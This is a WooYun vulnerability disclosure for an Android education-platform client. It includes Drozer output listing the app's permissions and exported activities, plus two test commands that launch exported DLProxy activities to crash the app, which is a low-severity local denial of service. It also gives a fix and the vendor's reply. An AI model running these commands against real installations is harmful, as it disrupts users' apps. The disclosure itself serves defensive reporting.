wybug_title: 教育技术服务平台客户端拒绝服务漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-10-12：	细节已通知厂商并且等待厂商处理中									2015-10-12：	厂商已经确认，细节仅向厂商公开									2015-10-15：	细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）									2015-12-06：	细节向核心白帽子及相关领域专家公开									2015-12-16：	细节向普通白帽子公开									2015-12-26：	细节向实习白帽子公开									2016-01-11：	细节向公众公开  简要描述： 教育技术服务平台客户端拒绝服务漏洞 详细说明：  
dz> run app.package.info -a com.ime.xmppPackage: com.ime.xmpp  Application Label: 鏁欒偛鎶€鏈湇鍔″钩鍙?  Process Name: com.ime.xmpp  Version: **.**.**.**  Data Directory: /data/data/com.ime.xmpp  APK Path: /data/app/com.ime.xmpp-1.apk  UID: 10081  GID: [3003, 1015, 1006]  Shared Libraries: null  Shared User ID: null  Uses Permissions:  - android.permission.INTERNET  - android.permission.GET_PACKAGE_SIZE  - android.permission.WRITE_EXTERNAL_STORAGE  - android.permission.MOUNT_UNMOUNT_FILESYSTEMS  - android.permission.READ_PHONE_STATE  - android.permission.ACCESS_NETWORK_STATE  - android.permission.ACCESS_WIFI_STATE  - com.ime.xmpp.providers  - android.permission.GET_ACCOUNTS  - android.permission.USE_CREDENTIALS  - android.permission.MANAGE_ACCOUNTS  - android.permission.AUTHENTICATE_ACCOUNTS  - android.permission.WAKE_LOCK  - android.permission.RECEIVE_BOOT_COMPLETED  - android.permission.VIBRATE  - android.permission.READ_CALENDAR  - android.permission.WRITE_CALENDAR  - android.permission.RECORD_AUDIO  - android.permission.MODIFY_AUDIO_SETTINGS  - android.permission.DOWNLOAD_WITHOUT_NOTIFICATION  - android.permission.CHANGE_NETWORK_STATE  - android.permission.ACCESS_COARSE_LOCATION  - android.permission.ACCESS_FINE_LOCATION  - android.permission.CHANGE_WIFI_STATE  - android.permission.CHANGE_CONFIGURATION  - android.permission.write_apn_settings  - android.permission.CAMERA  - android.permission.CALL_PHONE  - com.ime.xmpp.permission.UPLOAD_STU_DZDA_BROADCAST  - com.ime.xmpp.permission.CONNECTIVITY_ACTION_BROADCAST  - com.ime.xmpp.permission.RECOVER_NOTIFY_BROADCAST  Defines Permissions:  - com.ime.xmpp.providers  - com.ime.xmpp.permission.UPLOAD_STU_DZDA_BROADCAST  - com.ime.xmpp.permission.CONNECTIVITY_ACTION_BROADCAST  - com.ime.xmpp.permission.RECOVER_NOTIFY_BROADCASTdz> run app.activity.info -a com.ime.xmppPackage: com.ime.xmpp  com.ime.xmpp.WelcomeFirstActivity    Permission: null  com.ryg.dynamicload.DLProxyActivity    Permission: null  com.ryg.dynamicload.DLProxyFragmentActivity    Permission: null
暴露组件：
com.ime.xmpp.WelcomeFirstActivity    Permission: null  com.ryg.dynamicload.DLProxyActivity    Permission: null  com.ryg.dynamicload.DLProxyFragmentActivity    Permission: null
可造成拒绝服务组件：
com.ryg.dynamicload.DLProxyActivitycom.ryg.dynamicload.DLProxyFragmentActivity
测试代码：
dz> run app.activity.start --component com.ime.xmpp com.ryg.dynamicload.DLProxyActivity

dz> run app.activity.start --component com.ime.xmpp com.ryg.dynamicload.DLProxyFragmentActivity


   漏洞证明：  

   修复方案：  设置export为false，或者在代码中添加try-catch捕获异常   版权声明：转载请注明来源 侦探911@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2015-10-12 18:46 厂商回复： 漏洞确认，会尽快在下面的版本中进行修复。感谢您对我们安全工作的关注。 最新状态： 暂无
